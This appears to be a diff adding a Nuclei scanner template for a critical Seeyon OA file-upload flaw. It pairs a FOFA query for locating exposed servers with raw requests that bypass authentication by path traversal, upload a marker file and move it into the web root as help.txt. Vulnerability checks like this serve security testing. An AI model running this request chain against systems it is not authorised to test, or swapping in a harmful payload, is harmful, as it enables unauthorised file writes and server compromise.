@@ -1,0 +1,83 @@
+id: seeyon-oa-processupload-file-upload
+
+info:
+  name: Seeyon OA File Upload
+  author: zp857
+  severity: critical
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,fileupload
+  metadata:
+    fofa-query: 'app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server") || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/" || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon" && body="seeyonProductId") || (body="/seeyon/common/") || (body="A8-V5企业版" && body="/seeyon/"))'
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/autoinstall.do/%2e%2e/%2e%2e/seeyon/fileUpload.do?method=processUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------7ded626340460
+        Cookie: JSESSIONID=A0B3D88262B489F5E24A5BA7E7E49F4D; JSESSIONID=A204CCE3A51C8DB591DC3F69B123881F
+
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="type"
+
+
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="extensions"
+
+        png
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="applicationCategory"
+
+
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="destDirectory"
+
+
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="destFilename"
+
+
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="maxSize"
+
+
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="isEncrypt"
+
+        false
+        -----------------------------7ded626340460
+        Content-Disposition: form-data; name="file1"; filename="2.png"
+        Content-Type: application/pdf
+
+        zp857
+        -----------------------------7ded626340460--
+
+      - |
+        POST /seeyon/autoinstall.do/%2e%2e/%2e%2e/seeyon/privilege/menu.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=uploadMenuIcon&fileid={{fileurls}}&filename=../../help/help.txt
+
+      - |
+        GET /seeyon/help/help.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: fileurls
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - fileurls\+","\+'(.*?)'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "zp857"
+
+      - type: status
+        status:
+          - 200
